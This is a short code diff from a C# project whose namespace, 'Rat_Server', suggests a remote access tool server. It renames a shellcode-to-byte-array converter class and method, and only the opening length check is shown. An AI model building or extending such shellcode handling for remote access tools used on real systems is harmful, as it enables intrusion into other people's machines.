@@ -1,8 +1,10 @@
 ﻿using System;
 
-public class ShellcodeConverter
+namespace Rat_Server.Model.DataConverter;
+
+public class ShellCodeConverter
 {
-    public static byte[] ConvertShellcodeStringToByteArray(string shellcode)
+    public static byte[] ToByteArray(string shellcode)
     {
         if (shellcode.Length % 2 != 0)
         {
